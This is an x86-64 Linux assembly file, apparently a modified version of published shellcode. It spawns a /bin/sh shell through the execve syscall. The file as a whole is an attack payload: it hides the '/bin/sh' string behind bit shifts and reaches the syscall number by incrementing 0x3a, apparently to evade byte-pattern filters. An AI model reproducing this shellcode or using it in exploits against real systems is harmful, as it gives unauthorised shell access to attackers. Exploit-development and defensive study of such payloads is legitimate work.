; Original Author Information:
; [Linux/X86-64]
; Dummy for shellcode:
; execve("/bin/sh", ["/bin/sh"], NULL)
; hophet [at] gmail.com


;MODIFED BY me@tehwinsam.com

global _start

section .text

_start:
 
 mov rbx, 0x68732f6e69622fee
 shr rbx, 0x2
 shr rbx, 0x2
 shr rbx, 0x4
 push rbx
 mov rdi, rsp
 push rax
 push rdi
 mov rsi, rsp
 mov al, 0x3a ; execve(3b)
 inc     rax
 syscall
